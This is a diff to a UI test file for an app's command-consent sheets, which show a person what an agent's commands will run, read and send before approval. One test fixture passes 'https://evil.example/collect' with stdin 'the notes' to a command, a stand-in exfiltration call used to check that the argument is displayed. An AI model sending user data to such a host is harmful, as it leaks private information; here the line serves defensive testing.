@@ -9,7 +9,7 @@ import type { Api } from "../protocol/client";
 import { useStore } from "../protocol/store";
 import { useRightPanelStore } from "../rightPanelStore";
 import { SlateSurface } from "./SlateSurface";
-import { useSlateStore } from "./store";
+import { askConsent, useSlateStore } from "./store";
 import type { SlateApi, SlateRecord } from "./wire";
 
 afterEach(cleanup);
@@ -72,6 +72,8 @@ describe("several commands waiting", () => {
     expect(link.querySelector("[data-slate-consent-cmd]")!.textContent).toBe('vercel link --yes --project "$PROJECT"');
     // What an Always cannot cover is said on the sheet: a script it names is bound, anything else it reads is not.
     expect(document.querySelector("[data-slate-consent-reach]")?.textContent).toBe("If a script it names changes, it asks again. The command can read anything you can.");
+    // A press is not the only start once Always is given: the agent may start it too, and the sheet says so.
+    expect(document.querySelector("[data-slate-consent-agent]")?.textContent).toBe("With Always in this thread, the agent can start it too.");
     expect(link.querySelector("[data-slate-consent-cadence]")!.textContent).toBe("Runs when you press it");
     expect(link.querySelector('[data-slate-consent-env="PROJECT"] dd')!.textContent).toBe("spoo-web");
     expect(link.querySelector('[data-slate-consent-env="VERCEL_TOKEN"] dd')!.textContent).toBe("•••••••••••• (24)");
@@ -82,6 +84,78 @@ describe("several commands waiting", () => {
     expect(within(sheet).getAllByRole("switch")).toHaveLength(3);
     expect(within(sheet).getAllByRole("switch").every(s => s.getAttribute("aria-checked") === "true")).toBe(true);
     expect(within(sheet).getByRole("button", { name: "Allow all" })).toBeTruthy();
+  });
+
+  it("shows each command's arguments, stdin, folder and timeout in its row, as the one-command sheet does", async () => {
+    const curl: SlateAsk = { ...LINK, args: ["https://evil.example/collect"], stdin: "the notes", timeoutS: 300 };
+    open(record(DOC, held("link", "disk"), [curl, DISK]));
+    const sheet = await screen.findByRole("dialog", { name: "Run these 2 commands?" });
+    const link = sheet.querySelector<HTMLElement>('[data-slate-approval="k-link"]')!;
+    expect(link.querySelector('[data-slate-consent-arg="1"] dd')!.textContent).toBe("https://evil.example/collect");
+    expect(link.querySelector("[data-slate-consent-stdin] dd")!.textContent).toBe("the notes");
+    expect(link.querySelector("[data-slate-consent-where]")!.textContent).toBe("on zingzy's MacBook Pro, in ~/spoo, 300 s at most");
+  });
+
+  it("shows each file a run reads, whole, and why it waits, on the one-command, several-commands and server sheets", async () => {
+    const parse: SlateAsk = { ...DISK, cmd: 'python3 "$SLATE_DIR/parse.py"', files: { "parse.py": "import json\nprint(json.dumps({}))" }, why: "parse.py changed since you allowed it" };
+    const shaped: SlateAsk = { ...(INBOX as Extract<SlateAsk, { kind: "server" }>), then: 'python3 "$SLATE_DIR/shape.py"', files: { "shape.py": "print('shaped')" } };
+    const shows = (at: Element, file: string, text: string, why: string) => {
+      expect(at.querySelector(`[data-slate-consent-file="${file}"] pre`)!.textContent).toBe(text);
+      expect(at.querySelector("[data-slate-consent-why]")!.textContent).toBe(why);
+    };
+    open(record(DOC, held("disk"), [parse]));
+    shows(await screen.findByRole("dialog", { name: "Run this command?" }), "parse.py", "import json\nprint(json.dumps({}))", "Parse.py changed since you allowed it.");
+    cleanup();
+    open(record(DOC, held("inbox"), [shaped]));
+    shows(await screen.findByRole("dialog", { name: "Let this slate use zoho-mail?" }), "shape.py", "print('shaped')", "Needs your approval.");
+    cleanup();
+    open(record(DOC, held("disk", "inbox"), [parse, shaped]));
+    const sheet = await screen.findByRole("dialog", { name: "Let this slate run these 2?" });
+    shows(sheet.querySelector('[data-slate-approval="k-disk"]')!, "parse.py", "import json\nprint(json.dumps({}))", "Parse.py changed since you allowed it.");
+    shows(sheet.querySelector('[data-slate-approval="mcp:zoho-mail"]')!, "shape.py", "print('shaped')", "Needs your approval.");
+  });
+
+  it("starts a row that arrives while the sheet is open switched off, so Allow answers only the rows the person saw", async () => {
+    const slates = open(record(DOC, held("link", "disk"), [LINK, DISK]));
+    const sheet = await screen.findByRole("dialog", { name: "Run these 2 commands?" });
+    act(() =>
+      useSlateStore.setState(s => {
+        const entry = s.byThread[row.threadId!]!;
+        return { byThread: { ...s.byThread, [row.threadId!]: { ...entry, record: { ...entry.record!, asks: [LINK, DISK, INBOX], values: { ...entry.record!.values, ...held("inbox") } } } } };
+      }),
+    );
+    const late = await within(document.body).findByRole("switch", { name: "Use zoho-mail" });
+    expect(late.getAttribute("aria-checked")).toBe("false");
+    await act(async () => fireEvent.click(within(sheet).getByRole("button", { name: "Allow 2" })));
+    expect(vi.mocked(slates.approve).mock.calls.map(c => c[1])).toEqual(["k-link", "k-disk"]);
+  });
+
+  it("shows why a run held for a limit waits instead of a Review that opens nothing, and a stuck review never blocks the next sheet", async () => {
+    const budget = "started 12 times in a minute; press to run it again";
+    const slates = open(record(DOC, { disk: { state: "held", why: budget, runs: 3 } }, []));
+    const threadId = useStore.getState().selectedThreadId!;
+    await waitFor(() => expect(document.querySelector('[data-slate-held="disk"]')).not.toBeNull());
+    const held = document.querySelector<HTMLElement>('[data-slate-held="disk"]')!;
+    expect(held.querySelector("[data-slate-held-why]")!.textContent).toBe(budget);
+    expect(held.querySelector("button")).toBeNull();
+    // A review asked for it anyway (an older window, a race): the reload finds no sheet and the ask is dropped.
+    act(() => askConsent(threadId, { run: "disk" }));
+    await waitFor(() => expect(useSlateStore.getState().asking[threadId]).toBeUndefined());
+    expect(slates.get).toHaveBeenCalledTimes(2);
+  });
+
+  it("opens no sheet over the person's typing elsewhere, keeps the held row, and opens it once they stop", async () => {
+    const composer = document.body.appendChild(document.createElement("textarea"));
+    composer.focus();
+    try {
+      open(record(DOC, held("link"), [LINK]));
+      await waitFor(() => expect(document.querySelector('[data-slate-held="link"]')).not.toBeNull());
+      expect(screen.queryByRole("dialog")).toBeNull();
+      act(() => composer.blur());
+      expect(await screen.findByRole("dialog", { name: "Run this command?" })).toBeTruthy();
+    } finally {
+      composer.remove();
+    }
   });
 
   it("Allow all writes each command's own approval for the thread, the same call one sheet at a time makes", async () => {
